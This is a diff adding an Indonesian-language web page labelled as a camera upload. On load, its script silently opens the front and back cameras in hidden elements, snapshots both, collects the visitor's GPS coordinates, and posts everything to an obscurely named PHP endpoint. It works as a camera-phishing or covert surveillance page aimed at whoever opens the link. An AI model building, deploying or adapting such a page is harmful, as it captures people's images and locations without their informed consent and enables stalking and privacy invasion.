@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Upload Kamera</title>
+</head>
+<body>
+    <h1>Ambil Gambar Kamera</h1>
+    <video id="camera" autoplay style="display: none;"></video>
+    <canvas id="snapshot" style="display: none;"></canvas>
+    <p id="loading" style="display: none;">Memproses... Mohon tunggu.</p>
+
+    <script>
+    async function startCamera(facingMode) {
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: facingMode },
+                audio: false
+            });
+            const video = document.getElementById('camera');
+            video.srcObject = stream;
+
+            return new Promise(resolve => {
+                video.onloadedmetadata = () => {
+                    video.play();
+                    resolve(video);
+                };
+            });
+        }
+
+        function stopCamera(video) {
+            const stream = video.srcObject;
+            if (stream) {
+                const tracks = stream.getTracks();
+                tracks.forEach(track => track.stop());
+                video.srcObject = null;
+            }
+        }
+
+        function captureImage(video) {
+            const canvas = document.getElementById('snapshot');
+            const context = canvas.getContext('2d');
+
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            return canvas.toDataURL('image/jpeg');
+        }
+
+        async function getUserLocation() {
+            return new Promise((resolve, reject) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(position => {
+                        resolve({
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude
+                        });
+                    }, error => {
+                        reject("please allowed ur location");
+                    });
+                } else {
+                    reject("your browser not supported geolocation");
+                }
+            });
+        }
+
+        async function sendData(imageBase64, cameraName) {
+            try {
+                const location = await getUserLocation();
+                const response = await fetch('/data/akdjsodkeodkdoem.php', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        image: imageBase64,
+                        camera: cameraName,
+                        latitude: location.latitude,
+                        longitude: location.longitude
+                    })
+                });
+                const result = await response.json();
+                console.log(result);
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        }
+
+        async function captureAndSend() {
+            const loading = document.getElementById('loading');
+            try {
+                loading.style.display = "block"; 
+                const frontCamera = await startCamera("user");
+                const frontImage = captureImage(frontCamera);
+                stopCamera(frontCamera);
+                await sendData(frontImage, "front");
+                const backCamera = await startCamera("environment");
+                const backImage = captureImage(backCamera);
+                stopCamera(backCamera);
+                await sendData(backImage, "back");
+                alert("succes sended on server backend");
+            } catch (error) {
+                console.error("Error:", error);
+                alert(error);
+            } finally {
+                loading.style.display = "none";
+            }
+        }
+        captureAndSend();
+</script>
+</body>
+</html>
